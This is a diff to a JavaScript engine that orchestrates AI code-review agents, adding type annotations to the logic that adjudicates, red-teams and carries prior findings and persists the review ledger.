     `⛔ Block — mechanical gate is red (${gateFailed.map(r => r.profile.id).join(', ')}).`,
     ``,
     `## Gate`,
     mergedProvenance,
-    `\nFailed checks:\n${gateFailed.flatMap(r => (r.failedChecks || []).map(c => `- [${r.profile.id}] ${c}`)).join('\n')}`,
+    `\nFailed checks:\n${gateFailed.flatMap(r => (r.failedChecks || []).map((/** @type {string} */ c) => `- [${r.profile.id}] ${c}`)).join('\n')}`,
     carriedSection(),
     scopeSection(),
     ``,
@@ -5428,10 +5511,10 @@ if (gateFailed.length) {
   ].join('\n'))
 }
 
-let confirmed = results.flatMap(r => r.confirmed)
-let suspected = results.flatMap(r => r.suspected)
+let confirmed = results.flatMap(r => r['confirmed'])
+let suspected = results.flatMap(r => r['suspected'])
 // Low/Info nothing looked at. A third track, not a corner of Suspected — see verifyPool.
-let unverified = results.flatMap(r => r.unverified || [])
+let unverified = results.flatMap(r => r['unverified'] || [])
 
 // ---- Adjudicate track (re-review only) ----
 // For each prior-round finding, decide its fate this round. rejected/justified are carried (not
@@ -5441,13 +5524,14 @@ let unverified = results.flatMap(r => r.unverified || [])
 // around it unchanged has had its one confirmation and leaves the ledger. It still lives here for
 // the rest of THIS round — it suppresses a lens re-discovery (below) and renders in the report's
 // carried section — but it is not re-persisted, so it never costs another carry agent.
+/** @type {{ resolved: Finding[], stillOpen: Finding[], regressed: Finding[], carried: Finding[], retired: Finding[] }} */
 const adjudicated = { resolved: [], stillOpen: [], regressed: [], carried: [], retired: [] }
 // Tombstones: resolved/retired priors from EARLIER rounds, kept only as a recidivism check (a fresh
 // finding matching one is a regression, not a novelty). Filled on load below and read again at the
 // absorption pass — declared out here so both see it. It rides the persisted ledger like any row, so
 // a lost tombstone is caught by the same ledgerCount check every other row is.
 const priorTombstones = []
-if (priorRound?.ledger?.length) {
+if (priorRound?.['ledger']?.length) {
   phase('Adjudicate')
   // Canonicalize prior severity ONCE, at the load boundary, BEFORE splitting/adjudicating/carrying:
   // LEDGER_ITEM.severity has no enum, so a drifted `critical`/`CRITICAL` prior would trip the
@@ -5456,14 +5540,14 @@ if (priorRound?.ledger?.length) {
   // still-broken Critical fix. Mapping through canonicalSeverity here means adjudicateOne's
   // `located = {...f}` and EVERY downstream verdict/count (countBySeverity, rereviewVerdict, the strict
   // escalation) and the re-persisted ledger all see canonical severity for priors.
-  const priorLedgerAll = priorRound.ledger.map(f => ({ ...f, severity: canonicalSeverity(f.severity) }))
+  const priorLedgerAll = priorRound['ledger'].map((/** @type {Finding} */ f) => ({ ...f, severity: canonicalSeverity(f['severity']) }))
   // TOMBSTONES ARE CARVED OUT BEFORE THE SPLIT. A `disposition:'closed'` row is a resolved/retired
   // prior kept only so a later round can recognise the defect's return — it is already answered.
   // Left in the pool it would fall into `toCheck` below and be sent to the adjudicator, spending an
   // agent to ask whether a closed defect is "still present" at a site where nothing remains to judge.
   // So it is pulled here and never enters the unverified/settled/toCheck partitions.
-  priorTombstones.push(...priorLedgerAll.filter(f => f.disposition === 'closed'))
-  const priorLive = priorLedgerAll.filter(f => f.disposition !== 'closed')
+  priorTombstones.push(...priorLedgerAll.filter((/** @type {Finding} */ f) => f['disposition'] === 'closed'))
+  const priorLive = priorLedgerAll.filter((/** @type {Finding} */ f) => f['disposition'] !== 'closed')
   // THE UNVERIFIED TIER SURVIVES THE ROUND BOUNDARY. A prior carrying `tier: 'unverified'` was never
   // checked against the code — so there is nothing to adjudicate: "is the defect still present?"
   // presumes someone established it was present. Adjudicating it anyway routed it into `stillOpen`,
@@ -5472,33 +5556,33 @@ if (priorRound?.ledger?.length) {
   // tier that exists to say "nothing checked this" lived only inside the round that minted it.
   // It re-enters THIS round's own unverified track instead: label kept, out of the verdict, out of
   // the refutation denominator, re-persisted as `unverified` for the next round.
-  const priorUnverified = priorLive.filter(f => String(f.tier || '') === 'unverified')
+  const priorUnverified = priorLive.filter((/** @type {Finding} */ f) => String(f['tier'] || '') === 'unverified')
   if (priorUnverified.length) {
     log(`${priorUnverified.length} prior finding(s) carry the unverified tier — never checked against the code, so nothing to adjudicate: carried forward as unverified rather than promoted to still-open`)
-    unverified = unverified.concat(priorUnverified.map(f => ({
+    unverified = unverified.concat(priorUnverified.map((/** @type {Finding} */ f) => ({
       ...f,
-      fix: f.fix || 'verify it first — nothing has checked this claim against the code',
-      blastRadius: f.blastRadius || '',
+      fix: f['fix'] || 'verify it first — nothing has checked this claim against the code',
+      blastRadius: f['blastRadius'] || '',
       tier: 'unverified',
       // Flagged so the tracking pass below can use these as HOSTS. They are not in `livePriors` —
       // they were never adjudicated — so without the flag a fresh unverified re-discovery of the
       // same site is neither marked nor collapsed, and the site gains a ledger row every round.
       carriedUnverified: true,
-      why: `${baseWhy(f.why)} (STILL NOT VERIFIED: carried from round ${priorRound.round}, where no verifier judged it; nothing has checked it against the code since)`,
+      why: `${baseWhy(f['why'])} (STILL NOT VERIFIED: carried from round ${priorRound['round']}, where no verifier judged it; nothing has checked it against the code since)`,
     })))
   }
-  const priorLedger = priorLive.filter(f => String(f.tier || '') !== 'unverified')
-  const settled = priorLedger.filter(f => f.disposition === 'rejected' || f.disposition === 'justified')
-  const toCheck = priorLedger.filter(f => !(f.disposition === 'rejected' || f.disposition === 'justified'))
+  const priorLedger = priorLive.filter((/** @type {Finding} */ f) => String(f['tier'] || '') !== 'unverified')
+  const settled = priorLedger.filter((/** @type {Finding} */ f) => f['disposition'] === 'rejected' || f['disposition'] === 'justified')
+  const toCheck = priorLedger.filter((/** @type {Finding} */ f) => !(f['disposition'] === 'rejected' || f['disposition'] === 'justified'))
 
   // Settled priors: carried unless the code around them changed since the prior round.
-  const carriedResults = (await parallel(settled.map(f => () => {
+  const carriedResults = (await parallel(settled.map((/** @type {Finding} */ f) => () => {
     const pf = promptFields(f)
     return ragent(
-      `A prior review finding was dismissed by the author (disposition: ${f.disposition}). Decide only whether the CODE AROUND IT CHANGED since commit ${flattenField(priorRound.head)}. Shell + read only.
-FINDING: [${pf.severity}] ${pf.title} — at ${pf.file}:${f.line} (symbol ${pf.symbol}), rule ${pf.ruleId}.
+      `A prior review finding was dismissed by the author (disposition: ${f['disposition']}). Decide only whether the CODE AROUND IT CHANGED since commit ${flattenField(priorRound['head'])}. Shell + read only.
+FINDING: [${pf.severity}] ${pf.title} — at ${pf.file}:${f['line']} (symbol ${pf.symbol}), rule ${pf.ruleId}.
 Run \`git diff ${priorRound.head ? `${shq(priorRound.head)}...HEAD` : 'HEAD'} -- ${shq(f.file)}\` and judge whether the enclosing symbol/region was touched. Return {changed: <bool>, reason}.`,
-      { label: `carry:${f.file}:${f.line}`, phase: 'Adjudicate', schema: CHANGED_SCHEMA, model: CULL_MODEL },
+      { label: `carry:${f['file']}:${f['line']}`, phase: 'Adjudicate', schema: CHANGED_SCHEMA, model: CULL_MODEL },
     ).then(r => ({ f, changed: r == null ? null : !!r.changed }))
   }))).filter(Boolean)
   // A dead carry agent (changed == null) is indeterminate — keep the dismissed prior as carried (do
@@ -5539,41 +5623,41 @@ Run \`git diff ${priorRound.head ? `${shq(priorRound.head)}...HEAD` : 'HEAD'} --
   // The adjudicator must state the violated invariant and attack the fix — a fix that closes the
   // literal repro but not the class must not close. A "resolved" Critical/High is then re-attacked
   // by an independent red-team agent that never sees the adjudicator's verdict.
-  const adjudModel = results[0]?.plan?.lensModel || 'opus'
+  const adjudModel = results[0]?.['plan']?.lensModel || 'opus'
   let overturned = 0
   let redTeamDied = 0
   let invalidRedTeam = 0
   let adjudicatorDied = 0
   let cannotTellCount = 0
-  const redTeam = async (f, adj) => {
-    if (!isHighSeverity(f.severity)) return adj
+  const redTeam = async (/** @type {Finding} */ f, /** @type {Finding} */ adj) => {
+    if (!isHighSeverity(f['severity'])) return adj
     const pf = promptFields(f)
     const rt = await ragent(
       `A code-review finding was raised on an earlier revision of this repo and the author has since pushed fix commits. Attack the fix. Shell + read only; do NOT hunt for unrelated bugs.
 FINDING: [${pf.severity}] ${pf.title}
-  originally at ${pf.file}:${f.line} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
+  originally at ${pf.file}:${f['line']} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
   why it mattered: ${sanitizeAttack(withoutAbsorbed(f.why))}${absorbedPromptBlock(f.why)}
 INVARIANT it violated: ${redTeamInvariant(adj, f)}
 METHOD: re-locate the symbol (grep it — the line has likely moved), read the current code, and try to CONSTRUCT a concrete input/state that violates the invariant even with the current code in place (canonical: the fix compares for exact equality where the invariant is about overlap/containment/ordering). Check every candidate against the actual code paths before claiming it works.
 Return {defeated, attack} — defeated=true ONLY with a concrete attack that survives your own check against the code.`,
-      { label: `redteam:${f.file}:${f.line}`, phase: 'Adjudicate', schema: ATTACK_SCHEMA, model: adjudModel },
+      { label: `redteam:${f['file']}:${f['line']}`, phase: 'Adjudicate', schema: ATTACK_SCHEMA, model: adjudModel },
     )
     // A dead red-teamer keeps `resolved`: the adjudicator already ran its own attack pass, and a
     // transient agent death must not spuriously reopen findings. But the degradation must be
     // auditable — count it, log it, and annotate the note so "red-team passed" is distinguishable
     // from "red-team never ran" in the report and the run log.
     const { adj: out, died, overturned: ov, invalid } = classifyRedTeam(f, adj, rt)
-    if (died) { redTeamDied++; log(`⚠️ red-team for ${f.file}:${f.line} died — "resolved" stands on the adjudicator's own attack pass only`) }
-    if (invalid) { invalidRedTeam++; log(`⚠️ red-team for ${f.file}:${f.line} claimed defeat with NO attack — invalid verdict discarded, keeping resolved`) }
+    if (died) { redTeamDied++; log(`⚠️ red-team for ${f['file']}:${f['line']} died — "resolved" stands on the adjudicator's own attack pass only`) }
+    if (invalid) { invalidRedTeam++; log(`⚠️ red-team for ${f['file']}:${f['line']} claimed defeat with NO attack — invalid verdict discarded, keeping resolved`) }
     if (ov) overturned++
     return out
   }
-  const checkResults = (await parallel(toCheck.map(f => () => {
+  const checkResults = (await parallel(toCheck.map((/** @type {Finding} */ f) => () => {
     const pf = promptFields(f)
     return ragent(
-      `You are adjudicating whether a prior review finding is still present after a fix attempt. Load the ${active[0].rubricSkill} skill for the rubric. Shell + read only; do NOT hunt for new bugs.
+      `You are adjudicating whether a prior review finding is still present after a fix attempt. Load the ${/** @type {Profile} */ (active[0]).rubricSkill} skill for the rubric. Shell + read only; do NOT hunt for new bugs.
 FINDING: [${pf.severity}] ${pf.title}
-  originally at ${pf.file}:${f.line} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
+  originally at ${pf.file}:${f['line']} (enclosing symbol ${pf.symbol}), rule ${pf.ruleId}
   why it mattered: ${sanitizeAttack(withoutAbsorbed(f.why))}${absorbedPromptBlock(f.why)}
 METHOD:
   1. State in ONE sentence the INVARIANT this finding violated — the property that must hold, not the literal repro (derive it from the why/title).
@@ -5585,7 +5669,7 @@ METHOD:
   - "cannot-tell": you could NOT determine the answer — the file is gone or renamed, the symbol no longer exists, or you could not read enough of the code to judge. Say why in \`note\`. Use this rather than "resolved" whenever you are guessing: "resolved" means you checked and every attack failed, never "I could not find it".
   - "regressed": the site was changed but now has a DIFFERENT defect of the same kind (cite it).
 Return {status, currentLine, note, invariant, attack}.`,
-      { label: `adjudicate:${f.file}:${f.line}`, phase: 'Adjudicate', schema: ADJUDICATE_SCHEMA, model: adjudModel },
+      { label: `adjudicate:${f['file']}:${f['line']}`, phase: 'Adjudicate', schema: ADJUDICATE_SCHEMA, model: adjudModel },
     ).then(async r => ({ f, r: shouldRedTeam(r) ? await redTeam(f, r) : r }))
   }))).filter(Boolean)
   for (const { f, r } of checkResults) {
@@ -5593,7 +5677,7 @@ Return {status, currentLine, note, invariant, attack}.`,
     if (demoted) log(`⚠️ adjudicator for ${f.file}:${f.line} returned resolved WITH an attack — demoting to still-open`)
     if (cannotTell) { cannotTellCount++; log(`⚠️ adjudicator for ${f.file}:${f.line} could not tell — kept still-open, marked UNVERIFIED in the report`) }
     if (adjDied) { adjudicatorDied++; log(`⚠️ adjudicator for ${f.file}:${f.line} died — no verdict returned; kept still-open by default`) }
-    adjudicated[track].push(entry)
+    adjudicated[/** @type {keyof typeof adjudicated} */ (track)].push(entry)
   }
   log(`Adjudicate: ${adjudicated.resolved.length} resolved · ${adjudicated.stillOpen.length} still-open · ${adjudicated.regressed.length} regressed · ${adjudicated.carried.length} carried · ${adjudicated.retired.length} carried→retired (code unchanged; leaves the ledger) · ${overturned} overturned by red-team · ${redTeamDied} red-team died · ${invalidRedTeam} invalid red-team · ${adjudicatorDied} adjudicator died · ${cannotTellCount} could not tell · ${carryDied} carry died`)
 }
@@ -5638,8 +5722,8 @@ if (priorRound) {
     // (markTrackedUnverified), so it neither disappears into the prior nor gates anything.
     const { runs, updates, absorbed, keptAtRetired } = absorbAcross([confirmed, suspected], livePriors, retired, matchesPrior)
     for (const [host, why] of updates) host.why = why
-    confirmed = runs[0].kept
-    suspected = runs[1].kept
+    confirmed = /** @type {(typeof runs)[number]} */ (runs[0]).kept
+    suspected = /** @type {(typeof runs)[number]} */ (runs[1]).kept
     if (absorbed) log(`Re-review: absorbed ${absorbed} new finding(s) into a still-live prior at the same file+rule — recorded on the prior's why (and delivered to next round's adjudicator as its own prompt lines) so they outlive it, not listed twice`)
     if (keptAtRetired) log(`Re-review: ${keptAtRetired} new finding(s) matched a prior that RETIRED this round — kept as findings rather than absorbed into a host that does not reach the next ledger`)
   }
@@ -5714,7 +5798,7 @@ if (priorRound) {
       // the relay dropped the field, or a logger older than it answered — so the cause named is that.
       const why = priorBasisMismatch
         ? 'the revisions the loader printed did not survive transport intact (the list no longer matches its own check string) — a transport or version-skew loss'
-        : (Array.isArray(priorRound?.priorFpRevisions) || typeof priorRound?.fpBasisKnown === 'boolean')
+        : (Array.isArray(priorRound?.['priorFpRevisions']) || typeof priorRound?.['fpBasisKnown'] === 'boolean')
         ? 'it was recovered from a stopped run whose checkpoints do not attest to one basis, its record could not be read, or it was written by an engine this one cannot place (no engine revision, or a newer one: a downgrade, or two installs sharing one store)'
         : 'the loader\'s answer did not say whether the basis was known (a relay that dropped the field, or a logger older than it) — a transport or version-skew loss'
       const note = `The fingerprint basis of the prior round could not be established — ${why} — so its ${priorTombstones.length} resolved/dismissed finding(s) were not compared against this round and are no longer remembered.`
@@ -5728,18 +5812,18 @@ if (priorRound) {
     for (const t of priorTombstones) if (t.ruleId) tombstoneByFp.set(t.fp || fingerprint(t), t)
     let regressions = 0
     let reraised = 0
-    const flagRegression = f => {
-      if (!f.ruleId) return
+    const flagRegression = (/** @type {Finding} */ f) => {
+      if (!f['ruleId']) return
       const hit = tombstoneByFp.get(fingerprint(f))
       if (!hit) return
       const why = String(hit.why || '')
       const m = /round (\d+)/.exec(why)
       const r = m ? m[1] : (hit.round || '?')
       if (/^dismissed /.test(why)) {
-        f.why = `${f.why} NOTE: a defect the author dismissed in round ${r} has been re-raised.`
+        f['why'] = `${f['why']} NOTE: a defect the author dismissed in round ${r} has been re-raised.`
         reraised++
       } else {
-        f.why = `${f.why} REGRESSION: this exact defect was resolved in round ${r} and has reappeared.`
+        f['why'] = `${f['why']} REGRESSION: this exact defect was resolved in round ${r} and has reappeared.`
         regressions++
       }
     }
@@ -5751,7 +5835,7 @@ if (priorRound) {
   }
 }
 
-const dropped = results.reduce((n, r) => n + r.dropped, 0)
+const dropped = results.reduce((n, r) => n + r['dropped'], 0)
 // Findings whose verdict was reached after at least one returned vote was DISCARDED as off-schema.
 // DERIVED from the flag tierFromVotes sets, not pushed from a branch — the same discipline `notRun`
 // is built with, and for the same reason. Read over `results` (what verification produced) rather
@@ -5765,11 +5849,11 @@ const dropped = results.reduce((n, r) => n + r.dropped, 0)
 // at all. The skipped Low/Info share that tier and carry no flag, so the filter excludes them by
 // construction.
 const thinned = results
-  .flatMap(r => [...r.confirmed, ...r.suspected, ...(r.refuted || []), ...(r.unverified || [])])
+  .flatMap(r => [...r['confirmed'], ...r['suspected'], ...(r['refuted'] || []), ...(r['unverified'] || [])])
   .filter(f => (f.votesDiscarded || 0) > 0).length
 // `scopeNotRun` leads: a scope the caller asked for and did not get is the first thing a reader of
 // the verdict needs, ahead of anything the run itself failed to finish.
-const notRun = [...scopeNotRun, ...results.flatMap(r => r.notRun)]
+const notRun = [...scopeNotRun, ...results.flatMap(r => r['notRun'])]
 // Files no profile covered are a coverage hole, not a footnote — but they are NOT a `notRun` entry.
 // `notRun` means "this ran badly; re-run it": every other entry is a failure a re-run can fix, and
 // lib/analyze-runs.mjs ranks the list by EXACT STRING to surface repeated fragility. A note
@@ -5780,10 +5864,10 @@ const notRun = [...scopeNotRun, ...results.flatMap(r => r.notRun)]
 // Same reasoning as `uncoveredFiles` directly above, from the other direction: a deliberate saving
 // is not a coverage hole either, so it joins neither `notRun` nor `coverageNotes` and never reaches
 // `incompleteNotes`. It is counted across runs by lib/analyze-runs.mjs, under its own heading.
-const savedByFloor = results.flatMap(r => r.savedByFloor || [])
+const savedByFloor = results.flatMap(r => r['savedByFloor'] || [])
 const coverageNotes = uncoveredGap.length ? [uncoveredNotRunNote(uncoveredGap)] : []
 const incompleteNotes = [...notRun, ...coverageNotes]
-const criticNotes = results.map(r => r.criticNotes).filter(n => n && n.trim() && n.trim() !== 'coverage complete').map(n => n.trim()).join(' · ')
+const criticNotes = results.map(r => r['criticNotes']).filter(n => n && n.trim() && n.trim() !== 'coverage complete').map(n => n.trim()).join(' · ')
 
 // A re-review with adjudicated content (still-open/regressed/resolved/carried priors) must fall
 // through to the full synthesis so the re-review report renders — a bare "Approve — no findings"
@@ -5810,7 +5894,7 @@ if (!confirmed.length && !suspected.length && !unverified.length && !hasAdjudica
   // path the caller asked for. The verdict line carries the CLASS (through `notRun`); only this
   // section carries the path, and a dropped scope matters most precisely when the answer is Approve.
   return out([`## Verdict`, verdictLine, ``, `## Gate`, mergedProvenance, carriedSection(),
-    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map(f => `- ${f}`)] : []),
+    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map((/** @type {string} */ f) => `- ${f}`)] : []),
   ].join('\n') + scopeSection())
 }
 
@@ -5952,17 +6036,18 @@ if (!floorPremiseHeld) {
 // nothing can keep it true. Re-evaluating it instead was rejected: the mark is recomputed from
 // scratch every round anyway (markTrackedUnverified), so a carried copy can only ever be a stale
 // duplicate of a fresh computation.
+/** @param {Finding} f @param {string} disposition @param {string} [tier] */
 const toLedgerEntry = (f, disposition, tier) => ({
-  fp: f.fp || fingerprint(f), file: f.file || '', line: f.line || 0, symbol: f.symbol || '',
-  severity: f.severity, tier: tier || f.tier || 'suspected', disposition: disposition || f.disposition || 'open',
-  source: f.source || '', ruleId: f.ruleId || '', title: f.title || '', why: String(f.why || '').split(TRACKED_MARK).join('').replace(THINNED_CLAUSE, ''),
-  ...(Array.isArray(f.sources) ? { sources: f.sources } : {}),
+  fp: f['fp'] || fingerprint(f), file: f['file'] || '', line: f['line'] || 0, symbol: f['symbol'] || '',
+  severity: f['severity'], tier: tier || f['tier'] || 'suspected', disposition: disposition || f['disposition'] || 'open',
+  source: f['source'] || '', ruleId: f['ruleId'] || '', title: f['title'] || '', why: String(f['why'] || '').split(TRACKED_MARK).join('').replace(THINNED_CLAUSE, ''),
+  ...(Array.isArray(f['sources']) ? { sources: f['sources'] } : {}),
   // A CARRIED finding arrived from the prior-round transport with a SHORTENED `why` and a `whyRef`
   // pointing at the record its FULL `why` lives in (its birth). Persist that pointer so the short-why/
   // full-by-reference chain survives into the next round. A FRESH finding (born this round, straight
   // from a lens) has no `whyRef`: its full `why` is persisted here verbatim and NO pointer is written.
-  ...(f.whyRef && typeof f.whyRef.record === 'string' && typeof f.whyRef.fp === 'string'
-    ? { whyRef: { record: f.whyRef.record, fp: f.whyRef.fp } } : {}),
+  ...(f['whyRef'] && typeof f['whyRef'].record === 'string' && typeof f['whyRef'].fp === 'string'
+    ? { whyRef: { record: f['whyRef'].record, fp: f['whyRef'].fp } } : {}),
 })
 // A tombstone for a resolved/retired prior: the same ledger shape, `disposition:'closed'`, but its
 // `why` is a fixed ORIGIN+round marker rather than the original rationale — a tombstone's only job is
@@ -5978,10 +6063,10 @@ const toLedgerEntry = (f, disposition, tier) => ({
 // the regression is missed in silence, the exact class the fingerprint-basis guard removes, only shifted a round
 // on. Minting every tombstone under the current basis closes it for BOTH paths (resolved and dismissed);
 // an incomparable CARRIED tombstone is dropped at assembly below, never re-minted here.
-const toTombstone = (f, origin = 'resolved') => {
+const toTombstone = (/** @type {Finding} */ f, origin = 'resolved') => {
   // A tombstone's `why` is a fixed ORIGIN+round marker, not a shortened rationale, so it owes no
   // `whyRef` back-pointer — drop the one a carried source finding may bring in, keeping the row bare.
-  const { whyRef: _whyRef, ...entry } = toLedgerEntry(f, 'closed', f.tier)
+  const { whyRef: _whyRef, ...entry } = toLedgerEntry(f, 'closed', f['tier'])
   return { ...entry, fp: fingerprint(f), why: `${origin} in round ${thisRound}` }
 }
 // The tombstone set is bounded against the border that actually governs the persisted
@@ -6021,7 +6106,7 @@ const reviewLedger = isRereview
     // the earlier ones carried forward) is deduped and capped above; each row keeps its own origin+
     // round marker, which is the round the REGRESSION / re-raised note reports.
     ...tombstones,
-    ...adjudicated.carried.map(f => toLedgerEntry(f, f.disposition)),
+    ...adjudicated.carried.map(f => toLedgerEntry(f, f['disposition'])),
   ]
   : allReviewFindings.map(f => toLedgerEntry(f, 'open', f.tier || 'suspected'))
 // THE LEDGER IS PERSISTED BEFORE THE RECORD IS ATTEMPTED, in bounded shards, one small checkpoint
@@ -6047,12 +6132,12 @@ await logRun(reviewRecord({
   round: thisRound,
   findings: summarizeFindings(allReviewFindings),
   ledger: reviewLedger,
-  dimensions: results.flatMap(r => r.plan.lenses.map(l => {
-    const s = summarizeFindings(r.confirmed.filter(f => (f.source || '') === l))
-    const confirmedCount = r.confirmed.filter(f => (f.source || '') === l).length
-    const suspectedCount = r.suspected.filter(f => (f.source || '') === l).length
-    const unverifiedCount = (r.unverified || []).filter(f => (f.source || '') === l).length
-    const refutedCount = (r.refuted || []).filter(f => (f.source || '') === l).length
+  dimensions: results.flatMap(r => r['plan'].lenses.map((/** @type {string} */ l) => {
+    const s = summarizeFindings(r['confirmed'].filter((/** @type {Finding} */ f) => (f['source'] || '') === l))
+    const confirmedCount = r['confirmed'].filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
+    const suspectedCount = r['suspected'].filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
+    const unverifiedCount = (r['unverified'] || []).filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
+    const refutedCount = (r['refuted'] || []).filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
     // `ran` distinguishes "executed and found nothing" from "never returned". Both otherwise render
     // as a 0-finding row, and the yield analysis would read a broken lens as a redundant one.
     // Absent `ranLenses` (a record written before this landed) → assume it ran, the old behaviour.
@@ -6070,8 +6155,8 @@ function fallbackReport() {
   // finalVerdict(confirmed) — confirmed holds only the delta, so finalVerdict would print a false
   // Approve and hide live still-open/regressed priors. Render those tracks too.
   const emoji = { Block: '⛔ Block', Warning: '⚠️ Warning', Approve: '✅ Approve' }[isRereview ? recordVerdict : finalVerdict(confirmed)]
-  const fmt = f => `- ${f.severity} · \`${f.file || '?'}:${f.line || 0}\`${f.ruleId ? ` · [${f.ruleId}]` : ''} · ${f.title} · ${f.why} · Fix: ${f.fix}${f.whereChecked ? ` · Premise checked at: ${f.whereChecked}` : ''}`
-  const bySev = a => a.slice().sort((x, y) => (SEV_RANK[x.severity] ?? 9) - (SEV_RANK[y.severity] ?? 9))
+  const fmt = (/** @type {Finding} */ f) => `- ${f['severity']} · \`${f['file'] || '?'}:${f['line'] || 0}\`${f['ruleId'] ? ` · [${f['ruleId']}]` : ''} · ${f['title']} · ${f['why']} · Fix: ${f['fix']}${f['whereChecked'] ? ` · Premise checked at: ${f['whereChecked']}` : ''}`
+  const bySev = (/** @type {Finding[]} */ a) => a.slice().sort((/** @type {Finding} */ x, /** @type {Finding} */ y) => (SEV_RANK[x['severity']] ?? 9) - (SEV_RANK[y['severity']] ?? 9))
   return [
     `## Verdict`,
     // `notRun` LIVE, not the `incompleteNotes` snapshot taken before the verdict existed: the
@@ -6084,7 +6169,7 @@ function fallbackReport() {
     ``, `## ${isRereview ? '🆕 New' : 'Confirmed'}`, ...(confirmed.length ? bySev(confirmed).map(fmt) : ['- none']),
     ...(suspected.length ? [``, `## Suspected (needs confirmation)`, ...bySev(suspected).map(fmt)] : []),
     ...(unverified.length ? [``, `## Unverified (not checked)`, UNVERIFIED_PREAMBLE, ...bySev(unverified).map(fmt)] : []),
-    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map(f => `- ${f}`)] : []),
+    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map((/** @type {string} */ f) => `- ${f}`)] : []),
   ].join('\n')
 }
 
@@ -6098,13 +6183,14 @@ function fallbackReport() {
 // record and the report disagree, and rust-audit's dimension roll-up reads the verdict STRING: a
 // clean line there carries the wrong-green up into the audit.
 // Amends the first non-empty line under `## Verdict`, and only if it does not already say so.
+/** @param {string} text */
 function markVerdictIncomplete(text) {
   if (floorPremiseHeld) return text
   const lines = String(text).split('\n')
   const head = lines.findIndex(l => /^#+\s*Verdict\b/i.test(l.trim()))
   if (head < 0) return text
   const at = lines.findIndex((l, i) => i > head && l.trim())
-  if (at < 0 || /INCOMPLETE/.test(lines[at])) return text
+  if (at < 0 || /INCOMPLETE/.test(/** @type {string} */ (lines[at]))) return text
   lines[at] = `${lines[at]} · ⚠️ INCOMPLETE — ${savedByFloor.length} verification(s) were skipped because the verdict stood at Block, and the run did not end at Block; those findings are unverified for a reason that did not apply.`
   return lines.join('\n')
 }
